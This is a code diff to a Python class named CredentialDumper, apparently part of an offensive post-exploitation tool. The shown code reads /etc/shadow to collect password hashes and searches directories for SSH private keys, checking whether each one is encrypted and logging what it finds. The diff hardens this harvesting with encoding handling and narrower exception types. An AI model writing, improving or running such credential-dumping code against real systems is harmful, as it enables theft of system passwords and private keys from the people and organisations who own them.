@@ -344,7 +344,7 @@ class CredentialDumper:
         shadow_path = "/etc/shadow"
 
         try:
-            with open(shadow_path, 'r') as f:
+            with open(shadow_path, 'r', encoding='utf-8', errors='replace') as f:
                 for line in f:
                     parts = line.strip().split(':')
                     if len(parts) >= 2 and parts[1] and parts[1] not in ['*', '!', '!!']:
@@ -427,16 +427,16 @@ class CredentialDumper:
                     if not is_key and not item.endswith(".pub"):
                         # 检查文件内容
                         try:
-                            with open(item_path, 'r') as f:
+                            with open(item_path, 'r', encoding='utf-8', errors='replace') as f:
                                 first_line = f.readline()
                                 if "PRIVATE KEY" in first_line:
                                     is_key = True
-                        except Exception:
+                        except (IOError, OSError, PermissionError):
                             continue
 
                     if is_key:
                         try:
-                            with open(item_path, 'r') as f:
+                            with open(item_path, 'r', encoding='utf-8', errors='replace') as f:
                                 content = f.read()
 
                             # 检查是否加密
@@ -454,7 +454,7 @@ class CredentialDumper:
                             )
                             credentials.append(cred)
                             self._log(f"Found SSH key: {item_path}")
-                        except Exception:
+                        except (IOError, OSError, PermissionError):
                             continue
 
             except PermissionError:
